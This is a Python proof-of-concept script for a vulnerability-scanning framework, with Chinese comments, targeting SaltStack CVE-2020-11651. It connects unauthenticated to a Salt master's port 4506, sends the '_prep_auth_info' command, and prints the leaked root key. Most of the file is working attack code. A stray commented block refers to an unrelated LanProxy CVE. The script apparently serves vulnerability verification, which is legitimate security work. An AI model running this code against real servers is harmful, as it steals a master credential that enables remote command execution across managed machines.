from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight,req     # utils实现了一些常用函数，可以直接导入方便使用
import os
import sys
import salt
import salt.version
import datetime
import salt.transport.client
import salt.exceptions

POC_NAME = "SaltStack_RCE_CVE_2020_11651"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class SaltStack_RCE_CVE_2020_11651(BasePoc):

    # PoC实现类，需继承BasePoc
    # 为PoC填充poc_info、scan_info、test_case三个字典中的基本信息

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0016',    # PoC的VID编号
            'vbid': '',
            'Name': 'SaltStack RCE CVE-2020-11651',    # PoC名称
            'Author': 'atsud0',    # PoC作者
            'Create_date': '2021-7-14',    # PoC创建时间
            },

        'vul': {
            'Product': 'SaltStack',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'RCE',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                CVE-2020-11651
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-07-14',    # PoC公布时间
        }
    }

    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }
    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", True)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        master_ip = target
        master_port = '4506'
        minion_config = {
            'transport': 'zeromq',
            'pki_dir': '/tmp',
            'id': 'root',
            'log_level': 'debug',
            'master_ip': master_ip,
            'master_port': master_port,
            'auth_timeout': 5,
            'auth_tries': 1,
            'master_uri': f'tcp://{master_ip}:{master_port}'
        }
        clear_channel = salt.transport.client.ReqChannel.factory(minion_config, crypt='clear')
        try:
            resp = clear_channel.send({'cmd':'_prep_auth_info'}, timeout=2)
            for i in resp:
                if isinstance(i,dict) and len(i) == 1:
                    rootkey = list(i.values())[0]
                    if not rootkey:
                        if verbose:
                            highlight('\nFaild to fetch the Root Key ! \n[*] CVE-2020-11651 Not Found !')
                            sys.exit(1)
                    else:
                        self.scan_info['Success'] = True
                        self.scan_info['Ret']['VerifyInfo']['URL'] = master_ip+master_port
                        self.scan_info['Ret']['VerifyInfo']['DATA'] = resp
                        if verbose:
                            highlight(f'[*] CVE-2020-11651 Found !\n [*] The RootKey:{rootkey}')
        except Exception as e:
            print(e)
            highlight('\nFaild to fetch the Root Key ! \n[*] CVE-2020-11651 Not Found !')

            #if 'config.admin' in location:
            #    self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            #    self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
            #    self.scan_info['Ret']['VerifyInfo']['DATA'] = location
            #    if verbose:
            #        highlight('[*] LanProxy CVE-2021-3019 Found')
            #else:
            #    if verbose:
            #        highlight('[*] LanProxy CVE-2021-3019 Not Found')



    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)

